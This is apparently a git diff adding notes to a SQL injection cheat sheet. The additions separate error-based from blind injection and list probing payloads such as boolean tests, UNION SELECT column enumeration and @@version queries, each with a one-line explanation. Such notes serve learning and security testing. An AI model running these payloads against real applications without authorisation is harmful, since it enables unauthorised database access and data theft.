@@ -45,6 +45,27 @@ This type of SQL injection is based on booleans : True or False .
 - ' and substring(@@version,1,1)='5   &nbsp; |  &nbsp; find the version of the db
 
 
+if you get a error means that SQL vulnerability is error based, if not means blind SQl.
+
+For Blind SQL, we need to focus on the behavior of the application and try different queries :
+
+>>> ' and 'a'='a    |  if data displayed mean that there is SQL vulnerability 
+
+
+>>> ' UNION SELECT null;-- - |  this command is used to enumerate the database in order to know the number of columns it has
+
+
+>>>  ' UNION SELECT "else1";-- - | test the query with string,or intger to see the type of data in the columns
+
+>>>> 99999 ' UNION SELECT null;-- - |  to display our entered data on the fields
+
+
+>>>  99999 UNION SELECT @@version;| @@version is to know the version of the db
+
+>>>
+
+
+
 
 Automate the process of SQL blind
 >> script 
